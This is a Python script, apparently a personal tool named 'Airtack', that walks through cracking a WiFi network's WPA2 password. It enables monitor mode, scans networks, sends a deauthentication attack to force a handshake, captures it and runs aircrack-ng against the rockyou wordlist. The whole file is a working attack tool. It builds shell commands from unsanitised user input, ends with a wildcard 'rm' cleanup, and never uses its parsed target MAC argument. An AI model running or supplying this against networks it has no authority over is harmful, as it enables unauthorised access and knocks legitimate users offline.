#!/usr/bin/python3
###Written by Brandon Brozek###
###July 2017###
###Updated June 29th 2018###
import time
import os
import argparse

parser = argparse.ArgumentParser(description="Used to automatically walk through the WiFi hacking process.", epilog="Written by Brandon Brozek")
parser.add_argument("-c","--channel",dest="channel", help="Specify the channel that the wifi network is on")
parser.add_argument("-b","--bssid",dest="bssid", help="The BSSID of the network you want to hack.")
parser.add_argument("-f","--file",dest="file", help="The name file you want to save the capture to. Gets saved as a .pcap.")
parser.add_argument("-w","--wordlist",dest="wordlist",  help="The name of the wordlist to use when cracking the password.")
parser.add_argument("-t","--targetMAC",dest="targetMAC", help="Set the target MAC address for the deauthorization attack.")

#Initialize the arguments
args=parser.parse_args()

#Pick out the values passed by the user
channel = args.channel
bssid = args.bssid
file = args.file
wordlist = args.wordlist
targetMAC = args.targetMAC

os.system("clear")

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
print("                                              _________                 ")
print("                                             |=========|                ")
print("                    __[]__         _          \_______/                 ")
print("+================+ /______\     __(_)__    ()  \_____/   ()             ")
print(" `-+ +-----+---+ | |------|    /_______\  /__\  |   | +======+          ")
print("   | |     |   | +-+------+-.  |=======| <____> |   | ||    ||          ")
print("   | |     |   | |o          \_|___  __|__//\\__|___|_+======+          ")
print("   | +=========+ |o                                     o||=+           ")
print("   | *         * |o                   HSB               o||||           ")
print("   |    --%--    |o~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~o||=+           ")
print("   +=====================================+-----------+====+             ")
print("       |==/ ------ \=====/ ------ \===%--||o        o||____             ")
print("         // \  L_/__\___//_\__L_/__\_/ %=||o~~~~~~~~o||===\\_____       ")
print("        ||__ /.  ___________ .  ______/ +==============+      \  \_     ")
print("        ||   \__/   || ||   \__/   ||     //--\\  //--\\\\   \ \ \\\_   ")
print("         \\ / || \ //   \\ / || \ //     (( <> ))(( <> ))\\_\_\_\_\\\\  ")
print("          \========/     \========/       \____/  \____/  `-----------+ ")


print(bcolors.WARNING + "The Airtack script was written by Brandon Brozek in July of 2017." + bcolors.ENDC)
print(bcolors.HEADER + "First wifi networks within range will be scanned if arguments were not passed in.\nThen traffic will be sniffed for the WPA handshake. \nLastly, the program will attempt to crack the WPA password." + bcolors.ENDC)
input("Press [Enter] to continue")

###Start monitor and scan wireless networks###
# Start monitor mode and wait a second to make sure the interface is up.
os.system("airmon-ng start wlan0")
time.sleep(1)
# Checks to see if the bssid was parsed. If not then it asks for the channel or bssid depending on if one or the other was entered.
if bssid == None:
	# Makes sure there is a channel as well.
	if channel == None:
		channel=input("What channel would you like to scan on? ")
	# Sets default channel if noting was entered.
	if channel == "":
		channel="6"
		print("Channel defaulted to 6")
	# Runs the air dump command to determine what BSSIDs are available.
	initdumpcmd="timeout --foreground 2 airodump-ng -c "+channel+" wlan0mon"
	os.system(initdumpcmd)

	bssid = input('Copy and paste WPA BSSID you want ')

# If the BSSID was known but the channel was not, this command lets the user enter a channel.
if channel == None:
	channel=input("What channel is the network on?")

###Dump traffic from specific network###
# If no output file for the capture was specified it is entered here.
if file == None:
	file = input('Enter the output file you want to save to ')
# If nothing was entered then the file will be defaulted.
if file == "":
	file='default'
	print("File defaulted to default.pcap")

# The Deauthorization command to force a WPA2 handshake
deauthcmd="aireplay-ng --deauth 1 -a "+bssid+" -h "+bssid+" --ig -D wlan0mon"
os.system(deauthcmd)
# The airdump command to capture the WPA2 Handshake as it comes through.
dumpcmd="airodump-ng --bssid "+ bssid +" -c "+channel+" -w "+ file +" wlan0mon"
os.system(dumpcmd)


###Crack the captured file###
suffixfile = "-01.cap"
# Checks to see if a wordlist was parsed. If not the user is prompted to enter one.
if wordlist == None:
	wordlist = input('What is the absolute path of the wordlist you want to use? ')
# If no wordlist is specified, it is defaulted to rockyou.txt
if wordlist == "":
	wordlist="/usr/share/wordlists/rockyou_utf8.txt"
	print("Wordlist defaulted to rockyou.txt")
# Begins cracking the WPA2 handshake file.
crackcmd="aircrack-ng "+ file + suffixfile +" -w "+ wordlist
os.system(crackcmd)
# Stops the monitor mode interface.
os.system("airmon-ng stop wlan0mon")
# Removes the WPA2 handshake capture files to clean up the directory of the file.
cleanup="rm "+file+"*"
os.system(cleanup)
# Waits for user input to close the program.
input("Press [Enter] to escape the Program")
